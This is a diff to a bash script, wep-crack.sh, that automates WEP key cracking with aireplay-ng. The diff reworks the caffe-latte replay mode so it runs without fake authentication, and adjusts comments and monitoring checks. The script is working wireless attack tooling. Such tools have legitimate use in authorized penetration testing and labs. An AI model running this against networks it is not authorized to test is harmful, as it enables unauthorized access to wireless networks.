@@ -18,10 +18,9 @@
 #                 packetforge-ng builds an ARP request from it, and aireplay-ng --interactive replays
 #                 that. The fragment attack matches only frames addressed to that client, so -C is
 #                 required for forge.
-#   caffe   mode: aireplay-ng --caffe-latte. It needs no client address and sends no deauthentication.
-#                 It replays a broadcast ARP frame that a client sends, and the client answers with new
-#                 IVs. Until a client sends one, it works like passive mode: the IVs come from the
-#                 traffic the client already sends.
+#   caffe   mode: aireplay-ng --caffe-latte, with no fake station. It replays a broadcast ARP frame
+#                 (68 or 86 bytes) that a client sends, and the client's answers carry the IVs. Until a
+#                 client sends one, nothing is replayed and it works like passive mode.
 #
 # Usage:
 #   sudo ./scripts/wep-crack.sh -i wlp2s0 -b <AP_BSSID> -c <CHANNEL> [-e ESSID] [-m MODE] [-C <CLIENT_MAC>] [-o prefix] [-t N] [-x pps]
@@ -225,8 +224,9 @@ forge_arp() {
 }
 
 # Replay output: active keeps its arpreplay file name. The other modes write -replay.txt.
+# Only active and forge need the fake station. Caffe replays to the client, so it runs without one.
 REPLAY_OUT="${OUT}-replay.txt"
-if [[ "$MODE" != passive ]]; then
+if [[ "$MODE" == active || "$MODE" == forge ]]; then
   echo "[*] Associating with AP (fake auth)..."
   start_fakeauth
 fi
@@ -252,11 +252,11 @@ case "$MODE" in
     track_pid "$replay_pid"
     ;;
   caffe)
-    wait_for_association
-    # aireplay-ng 1.7 reads -b (the AP) here and never reads -c. It replays a broadcast ARP frame from a
-    # client when one comes; until then it only listens, so the IVs come from the client's traffic.
-    echo "[*] Caffe-latte: no client address needed. It replays a client's broadcast ARP when one comes."
-    ( cd "$RUNDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --caffe-latte -b "$BSSID" -h "$MYMAC" ${RATE_CAP:+-x "$RATE_CAP"} "$MON" ) \
+    # aireplay-ng 1.7 reads -b (the AP) here and never -c. It waits for a broadcast ARP frame of 68 or 86 bytes
+    # from a client, and replays it to the client. The client's answers carry the IVs, and the AP only has to
+    # accept the client's frames. Until a client sends such a frame, nothing is replayed.
+    echo "[*] Caffe-latte: no fake station. It replays a client's broadcast ARP frame (68 or 86 bytes) when one comes."
+    ( cd "$RUNDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --caffe-latte -b "$BSSID" ${RATE_CAP:+-x "$RATE_CAP"} "$MON" ) \
       >"$REPLAY_OUT" 2>&1 &
     replay_pid=$!
     track_pid "$replay_pid"
@@ -352,6 +352,8 @@ while true; do
   iw dev "$MON" info >/dev/null 2>&1 || die "$MON is gone: the card reset, or whatever started the monitor stopped it (see: sudo dmesg | tail -n 30)."
   if [[ "$MODE" != passive ]]; then
     kill -0 "$replay_pid" 2>/dev/null || die "Replay stopped; see $REPLAY_OUT"
+  fi
+  if [[ "$MODE" == active || "$MODE" == forge ]]; then
     check_fakeauth
   fi
   ivs=$(ap_ivs)
